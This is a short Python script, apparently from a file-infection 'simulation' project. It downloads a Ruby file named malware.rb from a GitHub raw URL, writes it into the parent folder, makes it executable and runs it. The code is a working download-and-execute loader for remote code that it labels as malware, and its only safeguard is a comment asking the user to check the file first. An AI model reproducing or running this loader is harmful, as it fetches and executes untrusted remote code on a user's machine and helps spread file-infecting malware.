import requests 
import os 
import subprocess

# Fetches the URL of a Ruby file named "Malware.rb" from GitHub
def get_url():
    # Please check Malware.rb before execute this script
    url = 'https://raw.githubusercontent.com/OguzKaira/Ruby-File-Infection-Simulation/main/src/malware.rb'
    r = requests.get(url, allow_redirects=True)

    return r 

# Changes the current working directory to the specified path (user folder)
# Attempts to write the downloaded file content (from the file object) to a local file named "Malware.rb"
def download(path , web):
    os.chdir(path)
    try:
        open('malware.rb', 'wb').write(web.content)
    except:
        pass

# Changes the current working directory to the specified path
# Executes the "Malware.rb" file using subprocess.run()
def execute_malware(path):
    file_path = path + '/malware.rb'
    os.chdir(path)
    # bypass 
    subprocess.run(["chmod", "+x", file_path])
    # run the script
    subprocess.run(["ruby", file_path])

# Main function
def main():
    base_dir = os.path.dirname(os.path.abspath(__file__))
    root_dir = os.path.dirname(base_dir)
    file = get_url()
    download(root_dir , file)
    execute_malware(root_dir)

if __name__ == "__main__":
    main()
